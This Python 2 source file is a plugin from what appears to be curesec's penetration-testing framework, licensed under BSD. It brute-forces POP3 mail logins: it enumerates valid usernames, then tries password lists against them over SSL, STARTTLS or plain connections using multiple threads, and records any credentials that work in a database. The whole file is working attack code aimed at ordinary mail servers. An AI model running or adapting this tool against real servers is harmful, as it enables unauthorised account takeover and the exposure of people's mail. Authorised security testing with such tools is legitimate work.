#!/usr/bin/env python
"""this plugin uses the popccd lib and executes a mail account bruteforce"""
# Copyright (c) 2014, curesec GmbH
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of
# conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list
# of conditions and the following disclaimer in the documentation and/or other materials
# provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used
# to endorse or promote products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

#from ctools import popccd
import popccd
import threading
import logging
import argparse
import sys
from multiprocessing import Queue
from ctools import cTuples
from ctools import cUtil
import socket
import ccdClasses as ccd
from datetime import datetime

__author__ = "curesec"
__version__ = "0.0.1"
__plgname__ = "popbruteforce"

# logging
LOG = "/tmp/" + __plgname__ + ".log"
FORMAT = '%(asctime)s - %(name)s - ' + \
    '%(levelname)s - %(threadName)s - %(message)s'
logging.basicConfig(filename=LOG,
                    filemode="w",
                    format=FORMAT,
                    level=logging.DEBUG)

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)


PASSWORD_QUEUE_LOCK = threading.Lock()
USER_QUEUE = Queue()
PASSWORD_QUEUE = Queue()


def test(user):
    conn = popccd.CCDPOP3(
        test.host,
        test.port,
        test.cryptolayer,
    )
    conn.banner()

    if (test.cryptolayer == "STARTTLS" and test.port == 110):
        conn.stls()

    exists = conn.user(user)
    if exists:
        yield (user)

    raise StopIteration


def brute(user, password):
    if user in brute.inv_users:
        raise StopIteration

    conn = popccd.CCDPOP3(
        test.host,
        test.port,
        test.cryptolayer,
    )
    conn.banner()

    if (test.cryptolayer == "STARTTLS" and test.port == 110):
        conn.stls()
    conn.user(user)
    ret = conn.pass_(password)
    if ret:
        with brute.lock:
            brute.inv_users.append(user)
        yield(user, password)
    raise StopIteration

brute.inv_users = []
brute.lock = threading.Lock()


class POPBruteForce(object):

    """this class implements the bruteforce logic"""

    def __init__(self, arguments, dbh):
        logger.info("Init POPBruteForce")
        self.host = None
        self.port = None
        self.cryptolayer = None
        self.dbh = dbh

        self.parse_arguments(arguments)

    def parse_arguments(self, args):
        """parse all command line arguments"""

        parser = argparse.ArgumentParser(
            formatter_class=argparse.RawTextHelpFormatter,
            prog=__plgname__,
            description="Bruteforce pop3 logins",
            epilog="""Examples:
       popbruteforce.plg -t pop.test.local -u user@host.tld -p password
       popbruteforce.plg -t pop.test.local -P pass.txt -U user.txt -nt 20
            """
        )

        parser.add_argument(
            "-t",
            help="target server address or hostname",
            dest='target',
            required=True,
        )

        parser.add_argument(
            "-port",
            help="port number, use 110 in combination with NOSSL/STARTTLS, 995 with SSL crypto",
            dest='port',
            type=int,
            default=-1,
            required=False,
        )
        parser.add_argument('-delay',
                            help='delay in between requests',
                            dest='delay',
                            default=0.0,
                            type=float
                            )

        parser.add_argument('-u',
                            help='usernames',
                            default=[],
                            nargs='+',
                            dest='users',
                            )
        parser.add_argument('-p',
                            help='passwords',
                            default=[],
                            nargs='+',
                            dest='passw',
                            )
        parser.add_argument('-U',
                            help='file containing one username per line',
                            default='',
                            dest='user_fn',
                            )
        parser.add_argument('-P',
                            help='file containing one password per line',
                            default='',
                            dest='passw_fn',
                            )

        parser.add_argument(
            "-c",
            help="cryptolayer STARTTLS/SSL/NOSSL (default SSL)",
            dest='crypto',
            default='SSL'
        )

        parser.add_argument(
            "-nt",
            help="thread count",
            dest='nthreads',
            type=int,
            default=1,
            required=False,
        )

        if not args:
            parser.print_help()
            sys.exit(1)

        arguments, _ = parser.parse_known_args(args)

        typ = cUtil.getTargetType(arguments.target)
        if typ == cUtil.TTYPE.DOMAIN:
            self.host = socket.gethostbyname(arguments.target)
            self.fqdn = arguments.target
        elif typ == cUtil.TTYPE.IP:
            self.host = arguments.target
            self.fqdn = ''
        else:
            print 'Invalid Target %s' % arguments.target

        self.port = arguments.port

        if (arguments.crypto):
            self.cryptolayer = str(arguments.crypto.upper())
            if self.port < 0:
                if self.cryptolayer == 'SSL':
                    self.port = 995
                else:
                    self.port = 110

        test.port = self.port
        test.host = self.host
        test.cryptolayer = self.cryptolayer

        try:
            ig_users = cTuples.cInputGenerator(data=arguments.users,
                                               filename=arguments.user_fn,
                                               expand_cb=test,
                                               prepare_cb=lambda x: x.strip(),
                                               maxthreads=arguments.nthreads,
                                               circle=False)
        except cTuples.ENoInput:
            print 'Error: No Usernames specified, please use the -u/U parameter to set usernames(s)'
            sys.exit(1)

        try:
            ig_passw = cTuples.cInputGenerator(data=arguments.passw,
                                               filename=arguments.passw_fn,
                                               prepare_cb=lambda x: x.strip(),
                                               maxthreads=arguments.nthreads,
                                               circle=True)
        except cTuples.ENoInput:
            print 'Error: No Passwords specified, please use the -p/P parameter to set password(s)'
            sys.exit(1)

        ig_users.start()
        ig_passw.start()
        self.tuples = cTuples.cTuples(inputs=[ig_users, ig_passw], prep_callback=brute, delay=arguments.delay)
        self.tuples.start()

    def save_result(self, user, password):
        """write the results into the database"""

        logger.debug("save result %s %s", user, password)

        if (self.dbh):
            account = ccd.MailAccountResult(
                protocol="POP",
                cryptolayer=self.cryptolayer,
                user=user,
                password=password,
                ip=self.host,
                fqdn=self.fqdn,
                port=self.port
            )
            self.dbh.add(account)

    def start(self):

        start_time = datetime.now()

        print 'Pop bruteforce started'
        print '-' * 80
        print 'Logins'
        print '-' * 80
        row_fmt = "{:20}{:20}{:>40}"
        for username, password in self.tuples.tuple_q:
            print row_fmt.format(password, username, self.host + ':' + str(self.port), '')
            self.save_result(username, password)

        self.tuples.join()
        print("\nfinished in %fs" % cUtil.secs(start_time))
